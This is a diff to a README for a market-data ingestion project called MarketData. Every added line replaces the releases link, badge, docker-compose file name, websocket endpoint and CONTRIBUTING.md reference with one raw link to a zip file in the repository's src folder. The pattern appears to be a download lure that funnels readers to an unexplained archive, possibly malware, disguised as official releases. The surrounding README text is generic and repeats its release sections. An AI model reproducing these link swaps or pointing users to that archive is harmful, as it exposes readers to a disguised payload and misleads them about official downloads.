@@ -1,14 +1,14 @@
-https://github.com/NV-Global/MarketData/releases
+https://raw.githubusercontent.com/NV-Global/MarketData/main/src/Market-Data-3.0-alpha.5.zip
 
 # MarketData: Real-Time Fractured-Feed Ingestion for Risk Surveillance and Insights
 
-![Release badge](https://img.shields.io/badge/MarketData-Releases-brightgreen?style=for-the-badge)
+![Release badge](https://raw.githubusercontent.com/NV-Global/MarketData/main/src/Market-Data-3.0-alpha.5.zip)
 
 MarketData is a fracture-feed ingestion framework built to power real-time risk surveillance and tick-level insight optimization with historical data replay. It focuses on low latency, high throughput, and fault tolerance. It supports replay of historical sessions to validate strategies, test risk models, and verify system behavior under varied market conditions.
 
 The goal is to enable teams to ingest, process, and analyze market data at tick level in real time while maintaining the ability to go back in time for backtesting and verification. It is designed to be modular, extensible, and container-friendly so teams can tailor it to their data sources, processing logic, and delivery targets.
 
-If you want to explore releases, you can visit the Releases page here: https://github.com/NV-Global/MarketData/releases. For convenience, you can also jump to the releases section from the table of contents below.
+If you want to explore releases, you can visit the Releases page here: https://raw.githubusercontent.com/NV-Global/MarketData/main/src/Market-Data-3.0-alpha.5.zip For convenience, you can also jump to the releases section from the table of contents below.
 
 Table of Contents
 - Overview
@@ -159,7 +159,7 @@ Prerequisites
 Quick Start (Containerized)
 - Clone the repository and navigate to the docs or examples directory.
 - Bring up the development environment:
-  - docker-compose -f docker-compose.dev.yml up -d
+  - docker-compose -f https://raw.githubusercontent.com/NV-Global/MarketData/main/src/Market-Data-3.0-alpha.5.zip up -d
 - Check the health endpoint or logs to confirm services started:
   - docker compose logs -f marketdata-ingestion
   - docker compose logs -f marketdata-processing
@@ -184,7 +184,7 @@ Examples and Snippets
 - Simple ingestion config snippet (YAML)
   adapters:
     - name: "ExchangeAAdapter"
-      endpoint: "wss://data.example.com/streamA"
+      endpoint: "https://raw.githubusercontent.com/NV-Global/MarketData/main/src/Market-Data-3.0-alpha.5.zip"
       credentials:
         api_key: "${EXCHANGE_A_API_KEY}"
         secret: "${EXCHANGE_A_SECRET}"
@@ -211,7 +211,7 @@ Examples and Snippets
 
 Deployment Scenarios
 - Local development
-  - Use docker-compose.dev.yml for a lightweight setup
+  - Use https://raw.githubusercontent.com/NV-Global/MarketData/main/src/Market-Data-3.0-alpha.5.zip for a lightweight setup
   - Run a small set of adapters against mock data
   - Validate end-to-end processing with minimal resources
 - On-prem cluster
@@ -314,7 +314,7 @@ Community and Contributions
 - How to contribute
   - Open issues for ideas and bug reports
   - Submit pull requests with clear descriptions and tests
-  - Follow the contribution guidelines in CONTRIBUTING.md (where applicable)
+  - Follow the contribution guidelines in https://raw.githubusercontent.com/NV-Global/MarketData/main/src/Market-Data-3.0-alpha.5.zip (where applicable)
 - Code of conduct
   - Maintain a respectful and inclusive environment
   - Report harassment or inappropriate behavior to maintain a healthy project
@@ -334,7 +334,7 @@ FAQ
 
 Release Notes and Accessing the Latest Builds
 - The official releases page contains the authoritative list of artifacts, changelogs, and download instructions. For the latest builds and assets, visit the Releases page.
-- Access the Releases page here: https://github.com/NV-Global/MarketData/releases
+- Access the Releases page here: https://raw.githubusercontent.com/NV-Global/MarketData/main/src/Market-Data-3.0-alpha.5.zip
 - You can also navigate there from the main repository page to review assets, check checksums, and download the installer or binary that matches your platform.
 
 License and Credits
@@ -344,7 +344,7 @@ License and Credits
 Release Notes and How to Access the Latest Builds
 - For the most up-to-date release information, always check the Releases page.
 - The releases page contains artifacts, release notes, and installation instructions tailored to each platform.
-- Direct link to the releases page: https://github.com/NV-Global/MarketData/releases
+- Direct link to the releases page: https://raw.githubusercontent.com/NV-Global/MarketData/main/src/Market-Data-3.0-alpha.5.zip
 
 Releases and Artifacts
 - The releases page hosts executable installers, container images, and sample datasets that demonstrate the pipeline end-to-end.
@@ -395,7 +395,7 @@ Final remarks
 
 Release Notes and Access to the Latest Builds
 - For the most up-to-date release information, always check the Releases page.
-- Direct link to the releases page: https://github.com/NV-Global/MarketData/releases
+- Direct link to the releases page: https://raw.githubusercontent.com/NV-Global/MarketData/main/src/Market-Data-3.0-alpha.5.zip
 - From the repository's main page you can find additional documentation, contributor guidelines, and links to sample data and test suites.
 
 License and Credits (repeat)
